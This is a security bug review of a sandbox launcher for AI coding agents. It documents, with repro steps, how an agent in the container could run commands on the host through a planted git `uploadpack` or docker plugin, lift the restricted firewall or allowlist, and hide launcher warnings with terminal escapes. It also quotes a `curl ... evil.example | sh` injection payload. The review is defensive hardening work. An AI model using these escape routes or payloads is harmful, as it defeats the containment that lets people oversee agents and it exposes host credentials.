# Bugs review — 2026-10-26

- **Review date:** 2026-10-26
- **Last reviewed commit:** `bec1c57` (`bec1c5737acdc549143e2c55e4a4b945ae27a287`, main, 2026-10-18 — "Merge pull request #312")
- **Window reviewed:** everything changed since 2026-09-01 — `8f32aa1` (last commit before Sep 1) .. `bec1c57`: 200 non-merge commits, 212 files. Pre-window code the window relies on was in scope where a reviewer hit a real defect; such findings say "Introduced: … (before the window)".
- **Rule:** only defects present at `bec1c57`. Anything introduced and fixed again inside the window is not listed.
- **Method:** eight area reviewers plus a docs-vs-code reviewer, run in parallel against the diff and the code at HEAD. Each finding was then triaged; the HIGH ones were re-checked against the code by the coordinator. Hermetic suite at HEAD: 98/98 under C.UTF-8, 96/98 under en_US.UTF-8 (TST-1). Falsify corpus + `check-ledger.sh --strict`: green. All 78 integration mutation patches apply.
- **Updated 2026-10-26:** batches 1 and 2 are merged (main `e426e09`). Section 9 lists what the reviews of those fixes found and left open, reviewed up to `e426e09`. Status lines cite the commits as merged.
- **Updated 2026-10-27:** batch 9 is merged (main `6a0b37f`). Section 10 lists what its 19 review rounds left open, reviewed up to `6a0b37f`.
- **Updated 2026-10-27:** batch 8 is merged (main `5da9aeb`); its two reviews left nothing open.
- **Updated 2026-10-28:** batch 10, the section 10 leftovers, is merged (main `86427b0` and the commits after it). Section 15 lists what its reviews left open, reviewed up to `708742d`.
- **Updated 2026-10-28:** batch 11 removes `SANDBOX_GIT_FIXTURES` (GIT-11, GIT-21, LNCH-16) and the `host` group, which mounted the real `$HOME` dot-directories read-write (the user's choice; see the CHANGELOG).
- **Companion:** [2026-10-26-feature-gaps-review.md](2026-10-26-feature-gaps-review.md).
- **Confidence:** CONFIRMED = reproduced, or unambiguous from the code. PLAUSIBLE = strong reasoning, not reproduced (usually needs hardware or a platform not available here); verify before fixing.
- **Citations** are by snippet, per AGENTS.md "Citing code". Scratch repro paths mentioned in entries were session-local and may no longer exist; each entry describes its repro in full.

## Fix batches (one PR per area)

| # | Area | Findings | Feature gaps folded in | Highest |
|---|---|---|---|---|
| 1 | Host-side launcher: git internals + launcher overlay | GIT-1, LNCH-1, LNCH-3 (partly) — fixed; LNCH-2 not reproducible (PLAT-1) | GAP-12 (only: follow includes inside included files) | HIGH |
| 2 | Launcher config / env layers / credentials | ENV-1 … ENV-6 — all fixed; REPO-1 found and fixed | — | HIGH |
| 3 | Container-start runtime tools (entrypoint root steps, reconciles) | RT-1 … RT-8 — all fixed; RT-9 open | stretch: GAP-1 for `link-default-ruby.sh`, `install-agent-skills.sh`, `agent-tools-reconcile.sh` | HIGH |
| 4 | Host lifecycle scripts (project-init, sync, repo, group, report) | PRJ-1 … PRJ-9, DOC-1, DOC-3, REPO-2 … REPO-4, REPO-7 — fixed (PRJ-7 with TST-1); REPO-5, 6, 8 … 12 open | optional: GAP-6; stretch: GAP-1 for `group.sh` | MEDIUM |
| 5 | In-container DB services | SVC-1 … SVC-4 — all fixed (SVC-2's hardware check is PLAT-4); SVC-5 fixed in a follow-up | — | MEDIUM |
| 6 | Build / Dockerfile / tools.d / config validation | BLD-1 … BLD-7 — fixed; ENV-7 fixed in batch 10; BLD-8 open | — | MEDIUM |
| 7 | Test harness and CI | TST-1 … TST-8 — all fixed (PRJ-7 with TST-1); TST-12 found and fixed; TST-9, TST-10 and TST-13 fixed in a follow-up, TST-11 in another, TST-14 and TST-15 in a third, TST-16 and TST-17 in a fourth, TST-18 in a fifth, TST-19 … TST-21 in a sixth (TST-21's `layer-checks.conf` comment waits for mgd-ai-containers) | GAP-5 (same fix as TST-2), GAP-8 (with TST-5), GAP-9 (with TST-3) — all done | MEDIUM |
| 8 | Docs (docs-only PR) | DOC-2, DOC-4 … DOC-13 — all fixed, with the same drift its reviews found elsewhere (a provenance check that could not fail among it) | GAP-14 (overlaps DOC-6) — done | MEDIUM |
| 9 | Launcher follow-ups (from the batch 1 hotfix review) | GIT-2 … GIT-5, LNCH-3 (the rest), LNCH-4 — all fixed; the HIGHs its reviews found fixed with them; its leftovers (section 10) fixed in batch 10 | — | MEDIUM |
| 10 | Batch 9 leftovers (section 10) | GIT-6 … GIT-19, LNCH-5 … LNCH-14 — fixed, with ENV-7; GIT-12 kept as it is, LNCH-7 documented, GIT-13 resolved fail-closed; leftovers open in section 15 | — | LOW |

Folded-in gaps are described in [2026-10-26-feature-gaps-review.md](2026-10-26-feature-gaps-review.md); each carries a matching `Fix batch:` line there. **Optional** = same files, but grows the batch; take it if the batch is small. **Stretch** = activate those files' deferred falsify targets in the same PR, so the new assertions are shown to be able to fail; it costs a mutation-score run per batch. The remaining gaps (GAP-2, 3, 4, 7, 10, 11, 13, and the rest of GAP-12) are a separate track.

Platform-specific items that need another OS or hardware to reproduce are in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md) (PLAT-1 … PLAT-4).

Duplicates merged: PRJ-2 is the same defect as DOC-1 (fix once, in batch 4); PRJ-7 is the same defect as TST-1 (fix once, in batch 7).

### HIGH — fix first

| ID | Summary |
|---|---|
| GIT-1 | The launcher's host-side `git ls-files` on an agent-controlled partial clone lazy-fetches and runs `remote.*.uploadpack` → arbitrary command on the **host** (reproduced 3/3). |
| ENV-1 | A committed `sandbox.env` can set `DOCKER_CONFIG`/`DOCKER_HOST`; `build.sh` then runs a planted `docker-buildx` CLI plugin on the host, with `GITHUB_TOKEN` (reproduced). |
| RT-1 | `link-default-ruby.sh` runs `~/.rvm/rubies/*/bin/* --version` as **root with NET_ADMIN**, after the restricted firewall is up; `~/.rvm` is agent-writable → firewall can be lifted (verified against entrypoint). |

### MEDIUM

GIT-2, ENV-2, ENV-3, ENV-4, LNCH-1, LNCH-2, RT-2, RT-3, RT-4, SVC-1, BLD-1, BLD-2, PRJ-1, PRJ-3, PRJ-5, DOC-1 (=PRJ-2), DOC-2, DOC-3, TST-1 (=PRJ-7), TST-2, TST-3.

### LOW

Everything else.

---

## 1. Host-side launcher: git internals

### GIT-1: Host command execution — the launcher runs `git ls-files` on an agent-controlled repo, which triggers a promisor lazy-fetch that executes `remote.*.uploadpack`
- **Status: FIXED (batch 1)** — `f3ddb69`, hardened in `1c26919` (`GIT_NO_LAZY_FETCH=1 GIT_ALLOW_PROTOCOL=none`; test G28). `1c26919` left the unreadable-index `WARNING:` silent: with every transport refused, `ls-files` logs `error: Could not read <tree>` and exits 0 with the entries under that tree left out (git 2.34, 2.43, 2.47, 2.49, 2.53), and only the exit status was checked, so G28's third assertion failed on every Linux. Found on the WSL2 PLAT-2 run (2026-10-26); the read now also counts an `error:`/`fatal:` line as a failure.
- Severity: HIGH — Confidence: CONFIRMED (reproduced 3/3, host-side)
- Location: `sandbox.sh: git_dirs_in()` — `mapfile -d '' -t links < <(git -C "$top" -c core.fsmonitor=false -c safe.directory='*' --git-dir="$g" --work-tree="$top" ls-files -s -z 2>/dev/null)`
- Introduced: 91fac80 (gitlink/submodule discovery via `ls-files`, within the review window)

**What's wrong.** The whole point of the git-internals overlay is that *nothing
the agent can write under `.git` may cause the HOST's git to run a program*. But
`git_dirs_in()` — invoked by `launcher_ro_overlay()` on the host, at every
`sandbox.sh` launch, against every git directory it finds under a writable mount,
**before** docker runs and before any read-only overlay exists — executes a live
`git ... ls-files -s` with `--git-dir`/`--work-tree` pointed at that repository.
The code's only defense is `-c core.fsmonitor=false`, and the comment states the
belief explicitly:

> "The index is read with git, fsmonitor off, so a config tampered with before
> this protection existed runs nothing here" … "ls-files runs nothing from a
> repository's config once fsmonitor is off."

That claim is false. In a **partial clone** (`extensions.partialClone`) with a
**sparse index** (`index.sparse` / sparse-checkout cone), `ls-files -s` must
expand the sparse index, which requires reading the tree object of a collapsed
directory. If that tree object is absent (a promisor object), git performs a
**lazy fetch** from the promisor remote, which runs the transport command the
repo's own config names — `remote.origin.uploadpack` (or an `ext::`/`file://`
transport). `core.fsmonitor=false` does nothing about this path.

**Failure scenario (within the sandbox threat model).** The agent, in any
container session, has write access to objects/refs/worktree of every repo under
a writable mount, and can `git init` brand-new nested repos (which are not
protected until the *next* launch). In session 1 it plants a nested repo
configured as a partial clone + sparse index with
`remote.origin.uploadpack = "<any command>; false"` and a missing tree object.
Nothing under `.git` shows in `git status`/`git diff` on the host, and the
launcher that protects repos runs only at launch. On the **next** launch,
`git_dirs_in()` discovers that repo and runs `ls-files -s` on it → lazy fetch →
the agent's command executes **as the host user, outside the container, before
the firewall**. The same fires on the *first* launch that protects a repo whose
config was tampered with before protection existed (exactly the case the comment
claims is safe), and on any partial clone the user themselves obtained with a
malicious `uploadpack`.

**Evidence.** Deterministic repro (3/3) calling `sandbox.sh`'s own
`git_dirs_in` on a planted `proj/evil` repo:
```
=== calling git_dirs_in (the launcher's own discovery) ===
EXECUTED during git_dirs_in:
uid=1000(ihudak) gid=1000(ihudak) groups=1000(...),459(docker),...
```
The planted repo:
```
git init evil; sparse-checkout init --cone --sparse-index; sparse-checkout set a
rm -f .git/objects/<b-tree>              # make the collapsed dir's tree a promisor miss
git config core.repositoryformatversion 1
git config extensions.partialClone origin
git config remote.origin.promisor true
git config remote.origin.url  file://.../nowhere
git config remote.origin.uploadpack "id > PWNED; false"
```
`id`'s output landed in `PWNED` every run. The exact launcher invocation
(`-c core.fsmonitor=false -c safe.directory='*' --git-dir=... --work-tree=...
ls-files -s -z`) is what ran it. `safe.directory='*'` additionally makes git
willing to do this even on a repo owned by another uid.

**Fix direction.** Run that `ls-files` (and any launcher git call that touches a
repo's live config) with lazy fetch disabled — set `GIT_NO_LAZY_FETCH=1` in its
environment (verified: with `GIT_NO_LAZY_FETCH=1` the `uploadpack` command does
not run). Belt-and-braces: also neutralise transports with
`GIT_ALLOW_PROTOCOL=` (empty) / `-c protocol.allow=never` and/or read gitlinks
without expanding the sparse index. The misleading comment in `git_dirs_in`
should be corrected — `core.fsmonitor=false` is not sufficient to make
`ls-files` inert on an untrusted repo.



## 1. Host-side launcher: read-only launcher overlay and mount verification

### LNCH-1: An agent can plant any number of fake launchers or unlistable directories, and each one adds a bind mount, warnings and launch time with no upper limit
- **Status: FIXED (batch 1)** — `643d9bd`, `c5f6fcc` (`SANDBOX_LAUNCHER_MAX`, shared link budget naming what it skipped; test T46).
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sandbox.sh: \`launcher_dirs_in()\`` (matches any directory holding `sandbox.sh` + `sandbox-common.sh`, and any unlistable directory the agent can reach). Also `sandbox.sh: \`launcher_ro_overlay()\``: the depth loop, the `ro_dsts` skip scan, and the per-launcher link scan `if (( ++nl > 200 )); then`.
- Introduced: the overlay and unreadable handling (window). The 200-links-per-launcher cap and T38 came later in the window and do not close this.
- What's wrong: AGENTS.md (Mount layout) says: "What the agent can write cannot make the check noisy or slow: links that sit in such an inner writable bind are not walked, a launcher that is itself a writable mount root is not walked, and at most 200 links per launcher are". The cap is **per launcher**, and the agent decides how many launchers there are. Two empty files make any directory in the writable project tree count as a launcher. That costs the agent nothing, and the host never runs it. Each such directory then gets all of the following on every later launch:
  - its own read-only overlay (and pins),
  - a `READ-ONLY:` line,
  - a manifest entry,
  - up to 200 link walks, each printing a `WARNING:`.
  `chmod 000` directories do the same through the unreadable-candidate path: one `:ro` bind plus one `WARNING` each. The git half has `SANDBOX_GIT_MAX` for exactly this concern ("the agent can make repositories and unlistable directories"). The launcher half has no such cap. Its loops are also quadratic: each candidate rescans `ro_dsts`, and the depth loop rescans every candidate.
- Failure scenario: during one session the agent runs `for i in $(seq 1000); do mkdir -p /workspace/proj/junk/l$i; touch /workspace/proj/junk/l$i/sandbox{,-common}.sh; for j in 1 2 3 4 5; do ln -s ../f /workspace/proj/junk/l$i/k$j; done; done`. The user's next launch then:
  - spends about 78 s in sandbox.sh before `docker run`,
  - adds 1001 `:ro` binds, about 50 s more per start on Docker Desktop by the doc's own 50 ms/bind figure,
  - prints 5000 `WARNING:` blocks.
  The real warnings, such as a genuine launcher link into a writable tree, are buried in that flood, and users learn to ignore the output.
- Evidence: reproduced. The fake-docker harness at `/tmp/claude-1000/-home-ihudak-dev-ai-tools-ai-containers/002098a4-b5ad-4f57-bc49-6373376abc59/scratchpad/launcher/harness.sh` copies the setup of `tests/test-launcher-dir-ro.sh`.
  - scratch script t1: baseline `args=66 warn=0`. With N=300, `args=668 warn=1500 ro=301`. With N=1000, `args=2068 warn=5000 ro=1001 ms=77799`.
  - scratch script t2 (200 `chmod 000` dirs): `ro-binds=202 warn=200 ms=3930`.
- Fix direction:
  - Put a total cap on launcher and unreadable overlays and on walked links per launch, like `SANDBOX_GIT_MAX`, and refuse the launch past it, naming where the overflow is.
  - Prune the launcher's inner writable binds (output dirs) from the `find`, instead of walking them and filtering afterwards.
  - Correct the AGENTS.md sentence.

### LNCH-2: The one anchor on `$HOME`'s filesystem stands in for launcher mounts on every other filesystem, so a non-preserving project filesystem is refused instead of skipped
- **Status: NOT REPRODUCIBLE (2026-10-26)** — run as PLAT-1 on Docker Desktop + WSL2 with the project on `/mnt/c`: Docker Desktop binds the distro's own drvfs mount, so device:inode survive the bind, verification runs over the drvfs entries and passes. No code changed; details in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md).
- Severity: MEDIUM — Confidence: PLAUSIBLE (reasoned, not reproduced: needs Docker Desktop + WSL2)
- Location: `entrypoint.sh: \`verify_launcher_mounts()\``, which compares `got="$(stat -c '%d:%i' /run/ai-launcher ...` once against `AI_LAUNCHER_ANCHOR` and then requires every manifest entry to match. The anchor is set in `sandbox.sh` by `_launcher_verify_dir="$HOME/.ai-containers/.verify-$$-$RANDOM"`.
- Introduced: a5e9948 / 7a4d5ae
- What's wrong: the anchor proves that the filesystem holding `~/.ai-containers` keeps device:inode across a bind. Nothing proves it for the filesystem holding each launcher source. When the project sits on a different filesystem that does not keep device:inode, the anchor matches, every entry mismatches, and the entrypoint says `ERROR: a launcher mount changed ... refusing to start`. That is a false accusation of a concurrent-container swap, it fires on every launch, and the user has nothing to act on.
- Failure scenario: Docker Desktop with WSL2 integration, `$HOME` on the distro's ext4, and the project on `/mnt/c/...` (drvfs). AGENTS.md itself discusses this setup ("a WSL drvfs path under /mnt/<drive>"). The daemon reaches `/mnt/c` through its own drvfs/9p mount in the docker-desktop distro, which is a different superblock with a different `st_dev`. The ext4 anchor survives, so verification runs. Every `.ai-containers` overlay is then reported as swapped, and the launch never starts. The same applies to any host where `$HOME` is passed through natively but some other source path goes through a file-sharing layer.
- Evidence: from the code, a single anchor gates every entry, and the manifest entries can come from any filesystem. Case 460 probes only one scratch directory, so it cannot catch this.
- Fix direction: anchor per device. For each distinct source `st_dev`, record one reference directory on that filesystem (for example the mount root, or the first source seen on that device). Skip with the NOTE only the entries whose reference does not survive the bind. Alternatively, on a mismatch, check the device of the mount root that holds the entry before calling it a swap.

### LNCH-3: Agent-chosen paths are printed raw to the host terminal
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`, after the batch 1 part (`c5f6fcc`): every launcher message that prints a scanned path renders it through `_term()`, which replaces C0 and DEL, UTF-8 C1 and the bidi controls (test T49). `%q` still passes bidi characters through: LNCH-8 in section 10.
- Severity: LOW — Confidence: CONFIRMED (found while fixing batch 1, 2026-10-26; shown with T46's escape fixture)
- Location: the `WARNING:`/`NOTE:`/`READ-ONLY:` lines throughout `sandbox.sh: \`launcher_ro_overlay()\`` and `git_dirs_in()`'s callers that print `%s` with a path found by scanning a writable mount — e.g. `printf 'WARNING: launcher link %s leads somewhere the agent can change:\n' "$f"`.
- What's wrong: those paths are names the agent chose. A directory or link named with terminal escape sequences (`$'\e]0;…\a'`, OSC 52 clipboard writes, cursor movement) is written verbatim to the host's terminal on the next launch, where it can retitle the window, hide or rewrite the warnings around it, or on terminals that honour OSC 52 set the clipboard.
- Failure scenario: the agent runs `mkdir -p "/workspace/proj/x"$'\e[2K\e[1A'` next to a real launcher link it wants unnoticed; the next launch's WARNING for that link is overwritten on screen.
- Evidence: T46 (`tests/test-launcher-dir-ro.sh`) plants `z$'\e]0;pwned\a'`; with `%s` the refusal carried the raw ESC (`^[]0;pwned^G`). The two refusal listings (`SANDBOX_LAUNCHER_MAX`, `SANDBOX_GIT_MAX`) now use `%q` (batch 1); every other site still prints raw.
- Fix direction: one helper that renders an agent-reachable path for the terminal (`%q`, or control characters replaced), used by every launcher message that prints a scanned path; a test that plants an escape in each message class.


## 2. Launcher config, env layers and credentials

### ENV-1: A committed sandbox.env can still run code on the host. `env_key_denied` covers shell keys only, and `load_env_defaults` exports every other key to docker and git
- **Status: FIXED (batch 2)** — `a8824e8`, widened by `9fe4e35` (machine-only keys, `--pull=never`), `6a2424e` (`SANDBOX_WORKDIR` resolved through symlinks), `7b55eb3` (only `..` is portable; every project-image `docker run` passes `--pull=never`, `tests/test-pull-never.sh`) and `6b2cbc7` (the seed image under any of its names); tests in `tests/test-sandbox-env.sh`, T1.
- Severity: HIGH (raised from MEDIUM in triage: host code execution from a file AGENTS.md calls inert, committed data). Confidence: CONFIRMED (reproduced)
- Location: `sandbox-common.sh: \`env_key_denied()\``, `sandbox-common.sh: \`load_env_defaults()\``
- Introduced: the deny-list approach predates the window. The window widened it (ca44e38, 987efac) but kept it limited to shell and loader keys.
- What's wrong: AGENTS.md and the `load_env_defaults` header say sandbox.env is "designed to be COMMITTED and shared". They say parsing plus the deny-list keeps it inert data ("These files configure the launcher, never the shell"). But any key not on the deny-list is `export`ed into the environment of every tool that build.sh, sandbox.sh and repo.sh run. The docker CLI reads its own keys from that environment:
  - `DOCKER_CONFIG=<dir>`: docker loads CLI plugins from `<dir>/cli-plugins/` ahead of the system ones. `docker build` is now `docker buildx build`, so a committed `docker-buildx` file runs on the host as the user. It also inherits `GITHUB_TOKEN`, which build.sh exports for `--secret id=github_token,env=GITHUB_TOKEN`.
  - `DOCKER_HOST=tcp://…` / `ssh://…` (or `DOCKER_CONTEXT`): the build, its BuildKit `github_token` secret, and every `-e` the launch passes (`COPILOT_GITHUB_TOKEN`, `GITHUB_PERSONAL_ACCESS_TOKEN`) go to a daemon the committer picks.
- Failure scenario: a project tracks `.ai-containers/` (the documented "version the portable config" mode). A PR adds `DOCKER_CONFIG=./ci` to sandbox.env and a `ci/cli-plugins/docker-buildx` file. In review it looks like config, which is exactly the BASH_ENV reasoning the code gives. The next `./build.sh` (or `./runme.sh`) runs the file.
- Evidence: in a scratch copy of HEAD (`git archive`), sandbox.env held `IMAGE_NAME=pwn-test` and `DOCKER_CONFIG=./evil`, and `evil/cli-plugins/docker-buildx` was a script that prints and exits. Running `./build.sh` printed `PWNED: fake buildx ran as ihudak args: buildx build --build-arg … --secret id=github_token,env=GITHUB_TOKEN … -t pwn-test …` (docker 29.7.2).
- Fix direction: give sandbox.env/sandbox.local.env an allow-list of the keys the launcher actually reads (IMAGE_NAME, AI_CONTAINER_*, CONTAINER_*, SANDBOX_*, EXTRA_MOUNTS, REPOS, the *_PATH pointers, …). If that is not done, at least deny `DOCKER_*`, `BUILDX_*`, `BUILDKIT_*`, `GIT_*` and `SSH_*`.

### ENV-2: repo.sh pastes SANDBOX_UID/SANDBOX_GID unvalidated into the `bash -c` scripts its seed containers run as root
- **Status: FIXED (batch 2)** — `01018ef`; `tests/test-repo-ids.sh`.
- Severity: MEDIUM. Confidence: CONFIRMED (reproduced with a fake docker)
- Location: `repo.sh: \`host_uid="${SANDBOX_UID:-$(id -u)}"\``. The value is used in `seed_from_path` (`-c "cp -a /src/. /dst/ && chown -R ${host_uid}:${host_gid} /dst"`), `sync_from_path` and `sync_from_git` (`chown -R '"${host_uid}:${host_gid}"' /dst'`).
- Introduced: the code predates the window. The window added the numeric/range check (`must be numeric ids from 0 to 4294967294`) to `sandbox.sh: \`launcher_ro_overlay()\`` only, and AGENTS.md tells users to export the same values for repo.sh.
- What's wrong: repo.sh sources sandbox-common.sh, so SANDBOX_UID comes from the environment or from a committed sandbox.env. It is spliced into script text without validation. `seed_from_git` passes it safely as `"$2"`, but the other three paths do not. `sync_from_git` runs that script with the host's `~/.ssh` mounted (`-v "$HOME/.ssh":/root/.ssh-host:ro`) and unrestricted network.
- Failure scenario: sandbox.env contains `SANDBOX_UID=1000 /dst; curl -s https://evil.example/x | sh; true`. The next `./repo.sh add|sync|reset` runs the payload as root in the seed container. For a git repo that container holds the host's SSH private keys.
- Evidence: with `REPO_BACKEND=volume ./repo.sh add demo <dir>` and a fake docker, the captured `-c` script was `cp -a /src/. /dst/ && chown -R 1000 /dst; curl -s https://evil.example/x | sh; true:1000 /dst`.
- Fix direction: validate host_uid/host_gid in repo.sh with the same `^[0-9]{1,10}$` / ≤4294967294 rule. Better still, pass the value as a positional argument (`"$2"`), as `seed_from_git` already does.

### ENV-3: Tool config and credential dirs that are symlinks get copied as symlinks, so the "group copy" mounts the host's real directory read-write
- **Status: FIXED (batch 2)** — `9b0da59`, dangling group links repaired in `7b55eb3` (copy, never the link; a group link out is warned about, not refused); `tests/test-tool-config-mounts.sh` case 13.
- Severity: MEDIUM. Confidence: CONFIRMED (reproduced with a fake docker)
- Location: `sandbox.sh: \`cp -a "$HOME/$_cdir" "$group_root/$_cdir"\`` (tools.d `config_dir` seeding, multi-path loop added in the window). Also `sandbox-common.sh: \`_copy_group_slice()\`` (`cp -a "$from" "$dst/$p"`, which gained `.aws .azure .kube` in the window), together with `sandbox.sh: \`add_mount_if_exists()\``, which calls `resolve_path` and follows the link.
- What's wrong: `cp -a` keeps a top-level symlink, so the group gets a symlink pointing at the host directory. `add_mount_if_exists` then resolves it and bind-mounts the host's real directory `:rw`. That breaks two documented promises: "a sandboxed agent never writes to the developer's real host config" (tools.d) and "a container can no longer write the developer's real AWS/Azure credentials" (.aws/.azure/.kube). Dotfile managers and hand-made links (`~/.aws -> ~/Dropbox/aws`, `~/.config/dtctl -> ~/dotfiles/…`) are common. The tools.d seeding runs for any existing group the first time the tool is enabled, not only for `from:host`. With a relative link (GNU stow), the copied link dangles instead: the mount is skipped with a WARNING and the seed is retried on every launch.
- Failure scenario: `~/.aws` is a symlink to `/x/dotfiles/aws`, `aws-cli=ON`, and the group is bootstrapped `from:host`. The run args contain `-v /x/dotfiles/aws:/home/<u>/.aws:rw`, which is the host's real credentials, writable by the agent. The same happens with `dtctl=ON` and a symlinked `~/.config/dtctl`.
- Evidence: in a scratch HOME with `.aws` and `.config/dtctl` as absolute symlinks, the captured docker args held `…/symrepro/dotfiles/aws:/home/ihudak/.aws:rw` and `…/symrepro/dotfiles/dtctl:/home/ihudak/.config/dtctl:rw`. `~/.ai-containers/default/.config/dtctl` was a symlink to the host directory.
- Fix direction: copy the link's target, not the link (`cp -RL`, or `cp -a "$from/." "$dst/$p/"` after `mkdir`). Before mounting, refuse or warn when a group path is a symlink leading outside the group root.

### ENV-4: When the host user is root, or SANDBOX_UID=0, the agent shell is root, and restricted mode's allowlist becomes agent-writable
- **Status: FIXED (batch 2)** — `974faba`, hardened in `24b2223` and `7b55eb3` (checked before any side effect); T30, `tests/test-entrypoint-wiring.sh`. The entrypoint half needs a `./build.sh`.
- Severity: MEDIUM (needs a root host user or an explicit SANDBOX_UID=0). Confidence: CONFIRMED from code in triage — `setup_sandbox_user()` finds UID 0 via `getent passwd "$uid"` and adopts `root`; nothing refuses it. Not run end-to-end.
- Location: `sandbox.sh: \`launcher_ro_overlay()\`` accepts 0 (`must be numeric ids from 0 to 4294967294`); `-e SANDBOX_UID="${SANDBOX_UID:-$(id -u)}"`; `entrypoint.sh: \`setup_sandbox_user()\``; `exec capsh --drop=cap_net_admin,cap_net_raw --user="$sandbox_user"`.
- What's wrong: AGENTS.md describes a "non-root agent shell". The capability reasoning relies on `capsh --user=` clearing the capability sets on the root→user setuid ("the agent shell ends up with no capabilities at all"). If sandbox.sh runs as root (a root WSL distro, a root CI box, `sudo ./sandbox.sh`), `id -u` is 0. The UID-0 user already exists, the name matches, and capsh switches 0→0, so only NET_ADMIN/NET_RAW leave the bounding set. The agent keeps CAP_DAC_OVERRIDE, CAP_KILL and the rest, and it owns every root-owned file. In restricted mode that includes `/tmp/allowlist-cidrs.txt` and `/tmp/allowlist-domains.txt`, which the root refresh loop re-reads every 60 s and loads into the ipset. Writing `0.0.0.0/1` and `128.0.0.0/1` there opens all egress with no NET_ADMIN needed. The agent can also kill the capture daemon.
- Failure scenario: a root host user runs `./sandbox.sh restricted`. The agent appends two CIDRs to /tmp/allowlist-cidrs.txt, and within 60 s egress is unrestricted.
- Evidence: entrypoint and refresh code paths as cited. `refresh-ipset-allowlist.sh` runs `ipset add "$tmp_v4" "$line"` for each CIDR line, on a loop.
- Fix direction: refuse SANDBOX_UID=0 / SANDBOX_GID=0 in the launcher (and in the entrypoint, as defence in depth), or map a root host user to a fixed non-root UID with a warning.

### ENV-5: `host_checkout_preflight` never runs for the all-CRLF checkout it was written for, and it does not scan the baked `services.d/*.sh`
- **Status: FIXED (batch 2)** — `aa10888` (scan extended; the all-CRLF limit is now documented rather than claimed).
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: `host-preflight.sh: \`host_crlf_files()\`` / `host_checkout_preflight()`, called after the caller has already been parsed and has sourced sandbox-common.sh and friends.
- What's wrong: the header says it "catches a checkout made before" `.gitattributes`, and AGENTS.md says it "refuses a CRLF script … (a Windows-side checkout)". In such a checkout every script is CRLF, so the shebang or the first line fails before the preflight can print its explanation. The guard only works for a tree where just some non-sourced files are CRLF. Separately, `services.d/*.sh` is COPYed into the image (`COPY services.d /etc/ai-containers/services.d`) but is not in the scanned set (`"$dir"/*.sh "$dir"/Dockerfile* … tools.d/*.conf allowlist-*.d/*.txt`), so a CRLF adapter gets baked and fails at runtime.
- Evidence: in a scratch copy with every `*.sh` converted to CRLF, `./sandbox.sh restricted` gave `env: 'bash\r': No such file or directory`, `bash ./sandbox.sh restricted` gave `line 2: set: pipefail: invalid option name`, and `./build.sh` gave the same `env` error. The preflight's message never appeared.
- Fix direction: reword the docs and header to the case it does cover (an individually edited fragment, descriptor or Dockerfile). Add `services.d/*.sh` (and `migrations/*.sh`) to the scan.

### ENV-6: A committed container.env can copy any host environment variable into the agent's shell with a bare `NAME` line
- **Status: FIXED (batch 2)** — `0343e6f` (`SANDBOX_ENV_PASSTHROUGH`); E13.
- Severity: LOW. Confidence: CONFIRMED (from code; documented docker behaviour)
- Location: `sandbox.sh: \`container_env_filter()\``. A bare NAME is forwarded "for docker to look up in this environment".
- What's wrong: the filter treats container.env as written by "whoever can commit to the project", yet it forwards a bare `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY` or `ANTHROPIC_API_KEY` line. docker fills these from the launching shell, so a host secret the launcher deliberately does not forward (build.sh's `GITHUB_TOKEN`, for example) reaches the agent. The agent can then use it or send it out through any allowlisted host. Only names the launcher passes with `-e` are refused.
- Fix direction: refuse bare names, or let them through only for names on an explicit allow-list (or behind an opt-in such as `SANDBOX_ENV_PASSTHROUGH=1` set in sandbox.local.env, never in a committed file).


## 3. Container-start runtime tools

### RT-1: link-default-ruby.sh runs agent-writable binaries as root, before the capability drop, so the restricted firewall can be lifted
- **Status: FIXED (batch 3)** — `38cf74e`. The probes run as the sandbox user (`runuser`, the user's HOME, `timeout -k 2 10`); as root with no user named, nothing from `~/.rvm` runs. The review of batch 3 found that `ln -sf` onto a link to a directory wrote inside it; every `ln` is now `-sfn` and a directory is never linked (`ce33ed9`). Tests run as root too (`59a7690`): `tests/test-ruby-wrapper.sh`; mutations 740 and 745 regenerated. Verified as root in ubuntu:24.04. Integration case 740 not re-run (needs an rvm image build).
- Triage: re-verified — in the `restricted)` arm of entrypoint.sh, `apply_restricted_firewall` runs first and `link_default_ruby` later calls the script with no `runuser`, before `exec capsh`; the script's `"$bin_dest/$b" --version` executes the symlinked rvm binaries.
- Severity: HIGH — Confidence: CONFIRMED (the execution is reproduced; that it runs as root is read from entrypoint.sh)
- Location: `link-default-ruby.sh: \`"$bin_dest/$b" --version >/dev/null 2>&1 && continue\``, called from `entrypoint.sh: \`link_default_ruby()\`` (`env RUBY_VERSIONS=... bash /usr/local/bin/link-default-ruby.sh` with no runuser)
- Introduced: 08ea799 (2026-08-05, before the window, but every container start still runs it)
- What's wrong: `link_default_ruby` runs as root in all three modes. In restricted mode the firewall is already up and the container still holds NET_ADMIN/NET_RAW. The script's verify step runs `ruby`, `gem`, `bundle`, `rake`, `irb` and `erb` with `--version`. Each of those is `~/.rvm/rubies/<default>/bin/<b>`, or wherever the agent-controlled `rubies/default` symlink leads. `~/.rvm` is the group's named volume, owned by the sandbox UID and writable by every agent in every container of that group.
- Failure scenario: an agent in any container of group G replaces `~/.rvm/rubies/ruby-3.3.6/bin/ruby` (or repoints `rubies/default`) with a script. On the next start of any restricted container in G, that script runs as root with NET_ADMIN, before `exec capsh`. It can run `iptables -P OUTPUT ACCEPT; iptables -F` or `ipset add`, or fork a root daemon that outlives the handover. The agent shell then has unrestricted egress while the banner says restricted. The planted binary is also the one that gets linked into `/usr/local/bin`, so a later `docker exec` as root that runs `ruby` executes it too.
- Evidence: I planted a `ruby` that logs `id -u`, then ran `RUBY_VERSIONS=3.3.6 bash link-default-ruby.sh <home> <dest>`. The log shows `planted ruby ran as uid=1000 args=--version`: the script executes whatever it finds there. In the entrypoint the same script runs as uid 0.
- Fix direction: never execute anything from `~/.rvm` as root. Run the `--version` probe as the sandbox user (`runuser -u "$sandbox_user" -- "$bin_dest/$b" --version`), or move the verify-and-repoint decision into rvm-reconcile.sh, which runs as the user, and keep root to `ln` only.

### RT-2: install-agent-skills.sh's stamp ignores which agents are enabled, so a newly enabled agent never gets skills
- **Status: FIXED (batch 3)** — `bfe1349` (one stamp line set per target: the cross-client skill and each agent); `tests/test-agent-skills.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
